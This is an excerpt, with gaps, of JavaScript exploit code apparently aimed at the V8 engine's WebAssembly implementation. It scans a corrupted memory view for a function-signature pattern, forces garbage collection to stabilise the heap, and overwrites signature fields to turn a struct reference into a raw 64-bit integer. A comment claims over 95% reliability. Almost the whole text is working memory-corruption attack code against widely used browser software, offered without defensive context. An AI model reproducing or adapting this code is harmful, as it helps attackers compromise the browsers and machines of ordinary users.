...
// slightly modified from https://stackoverflow.com/a/14163193
function u32find(needle, fromIndex = 0) {
  for (;;) {
    let index;
    for (index = fromIndex; memory.getUint32(index * 4, true) !== needle[0]; index++);

    let i, j;
    for (i = index + 1, j = 1; j < needle.length; i++, j++) {
      if (memory.getUint32(i * 4, true) !== needle[j]) {
        fromIndex = index + 1;
        continue;
      }
    }
...
// trigger gc to move sig podarray into old space, stabilizing heap
// exploit appears to have stability >95%
gc();
const from_offset = 0x2c0000;

let needle = new Uint32Array([
  /*map=*/ByteArrayMap, /*PodArrayBase::length=*/(4 * 4) << kSmiTagSize, /*ReturnCount=*/2, kRef | ($struct << kKindBits),
  kI64, kI64, kI64,
]);
let ofs = from_offset / 4;
for (let i = 0; i < 4; i++) {   // multiple copies...
  ofs = u32find(needle, ofs + 1);
  setField(ofs * 4 + kHeapObjectTag, 0xc, kI64);
}
